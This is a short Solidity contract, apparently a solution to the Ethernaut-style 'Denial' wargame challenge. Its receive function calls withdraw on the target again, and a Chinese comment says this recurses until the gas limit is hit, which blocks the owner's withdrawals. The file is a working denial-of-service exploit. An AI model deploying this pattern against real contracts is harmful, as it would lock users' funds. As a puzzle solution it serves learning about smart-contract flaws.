// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DenialI {
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint256);
    function withdraw() external;
}

contract PartnerHack {
    DenialI public denial;

    constructor(address _denial) {
        denial = DenialI(_denial);
    }

    receive() external payable {
        // 递归循环调用，直到gas超过上限
        denial.withdraw();
    }
}
